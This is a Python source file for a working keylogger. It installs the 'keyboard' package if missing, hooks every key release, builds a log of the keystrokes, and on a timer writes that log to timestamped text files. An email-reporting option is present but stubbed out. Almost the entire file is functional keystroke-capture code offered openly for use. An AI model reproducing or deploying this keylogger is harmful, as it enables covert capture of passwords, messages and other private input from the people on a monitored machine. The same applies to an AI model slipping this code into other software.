import subprocess
import os
import sys
import urllib.request
import datetime
import smtplib 
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


class Packages:
    def __init__(self) -> None:
        if self.connect() == False:
            print(f'[\033[31m!\033[0m] - Check your internet connection!')
            sys.exit()
        get_pckg = subprocess.check_output([sys.executable, '-m', 'pip', 'freeze'])
        installed_packages = [r.decode().split('==')[0] for r in get_pckg.split()]
        required_packages = ['keyboard']
        for packg in required_packages:
            if packg in installed_packages:
                print (f'[\033[36m*\033[0m] - Package {packg} are installed')
            else:
                print(f'[\033[32m!\033[0m] - installing package \033[33m{packg}\033[0m')
                os.system('pip3 install ' + packg)

    @staticmethod
    def connect(url: str = 'https://google.com'):
        try:
            urllib.request.urlopen(url)
            return True
        except:
            return False

packages = Packages()
import keyboard

class Keylogger:
    def __init__(self, interval:int = 60, report_method='email') -> None:
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
        
    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                # self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
                pass
            elif self.report_method == "file":
                self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
    
        # block the current thread, wait until CTRL+C is pressed
        try:
            keyboard.wait()
        except KeyboardInterrupt:
            print(f'[\033[35m!\033[0m] - Exit ...')
            exit()

if __name__ == '__main__':
    keylogger = Keylogger(interval=120,report_method="file")
    keylogger.start()

